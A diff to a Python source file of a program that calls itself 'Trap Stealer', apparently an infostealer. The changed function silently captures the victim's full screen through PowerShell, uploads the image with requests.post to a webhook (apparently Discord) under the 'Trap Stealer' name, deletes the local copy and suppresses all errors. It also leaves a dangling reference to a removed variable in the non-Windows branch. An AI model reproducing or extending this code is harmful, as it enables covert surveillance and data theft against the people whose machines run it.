@@ -1183,31 +1183,42 @@ def ZipThings(path, arg, procc):
     else:
         OtherZip.append([name, lnik])
 
+
 def srcs():
     try:
-        img_path = os.path.join(os.path.expanduser("~"), "screenshot.png")
 
         timestamp = str(int(time.time()))
         rah2 = 'dneS'
         if os.name == "nt":
-            command = ["powershell", "-Command", f"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.{rah2[::-1]}Keys]::{rah2[::-1]}Wait(\"{0}\" ); Start-Sleep -m 500; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bmp = New-Object System.Drawing.Bitmap $screen.width, $screen.height; $graphics = [System.Drawing.Graphics]::FromImage($bmp); $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $screen.Size); $bmp.Save(\"{1}\")"]            
-            command[2] = command[2].format("{PRTSC}", img_path)
+            
+            image_folder = os.path.join(os.environ["USERPROFILE"], "Pictures")
+
+            command = [
+                "powershell.exe",
+                "-Command",
+                f"Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen; $Width  = $Screen.Width; $Height = $Screen.Height; $Left   = $Screen.Left; $Top    = $Screen.Top; $bitmap  = New-Object System.Drawing.Bitmap $Width, $Height; $graphic = [System.Drawing.Graphics]::FromImage($bitmap); $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size); $bitmap.Save('{image_folder}\\MyFancyScreenshot.png'); Write-Output 'Screenshot saved to:' ; Write-Output {image_folder}\\MyFancyScreenshot.png;"
+            ]
+
+            subprocess.run(command)
+
+            screenshot_path = os.path.join(image_folder, "MyFancyScreenshot.png")
+
+            with open(screenshot_path, "rb") as file:
+                file_data = file.read()
+                data = {
+                    "username": "Trap Stealer",
+                    "content": "Screen was successfully taken",
+                    "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
+                }
+                requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
+
+            os.remove(screenshot_path)
+
         else:
             command = ["import", "-window", "root", img_path]
 
-        subprocess.run(command, shell=True)
-        with open(img_path, "rb") as file:
-            file_data = file.read()
-            data = {
-                "username": "Trap Stealer",
-                "content": "Screen was successfully taken",
-                "avatar_url": "https://e7.pngegg.com/pngimages/1000/652/png-clipart-anime-%E8%85%B9%E9%BB%92%E3%83%80%E3%83%BC%E3%82%AF%E3%82%B5%E3%82%A4%E3%83%89-discord-animation-astolfo-fate-white-face.png"
-            }
-            requests.post(webhook, data=data, files={"file": ("screenshot.png", file_data)})
-            
     except Exception as e:
         pass
-
 
 def paaz():
     try:
@@ -1493,3 +1504,5 @@ def GatherAll():
         thread.join()
 
 GatherAll() 
+
+
